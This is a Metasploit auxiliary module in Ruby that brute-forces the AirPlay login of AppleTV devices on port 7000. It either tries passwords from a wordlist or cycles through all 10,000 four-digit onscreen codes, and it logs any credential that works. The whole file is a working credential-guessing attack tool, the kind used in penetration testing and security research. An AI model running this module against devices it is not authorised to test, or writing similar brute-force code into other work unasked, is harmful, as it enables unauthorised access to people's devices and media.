##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'AppleTV HTTP Login Utility',
      'Description'    => 'This module attempts to authenticate to an AppleTV service.
To bruteforce the Onscreen Code, unset PASS_FILE',
      'Author'         => ['0a29406d9794e4f9b30b3c5d6702c708'],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        OptPath.new('PASS_FILE',  [false, 'File containing passwords, one per line',
                                   File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')])
      ], self.class)
    register_autofilter_ports([7000])
  end

  def run_host(_ip)
    @uri = "http://#{rhost}:#{rport}/stop"
    if datastore['PASS_FILE'] && !datastore['PASS_FILE'].empty?
      print_status("Attempting to login to #{@uri} using password list")
      passwords = extract_words(datastore['PASS_FILE'])
      passwords.each do |pass|
        return :abort if do_login(pass) == :abort
      end
    else
      print_status("Attempting to login to #{@uri} by 'Onscreen Code'")
      (0..9999).each do |pass|
        return :abort if do_login(pass.to_s.rjust(4, '0')) == :abort
      end
    end
  end

  def do_login(pass)
    vprint_status("#{@uri} - Trying password:'#{pass}'")
    begin
      response = send_request_raw(
        'uri' => @uri,
        'method' => 'POST',
        'username' => 'AirPlay',
        'password' => pass
         )
    rescue ::Rex::ConnectionError
      vprint_error("#{@uri} - Failed to connect to the web server")
      return nil
    end

    result = determine_result(response)

    if result == :success
      print_good("#{@uri} - #{response.code} - Successful login: '#{pass}'")
      report_auth_info(
          host: rhost,
          port: rport,
          sname: 'http',
          user: 'AirPlay',
          pass: pass,
          realm: 'AirPlay',
          proof: "WEBAPP=\"Generic\", PROOF=#{response}",
          source_type: 'user_supplied',
          active: true
      )
      return :abort if datastore['STOP_ON_SUCCESS']
    else
      vprint_error("#{@uri} - #{response.code} - Failed to login as password '#{pass}'")
      return
    end
  end

  def determine_result(response)
    return :abort unless response.kind_of? Rex::Proto::Http::Response
    return :abort unless response.code
    return :success if [200, 301, 302].include?(response.code)
    :fail
  end
end
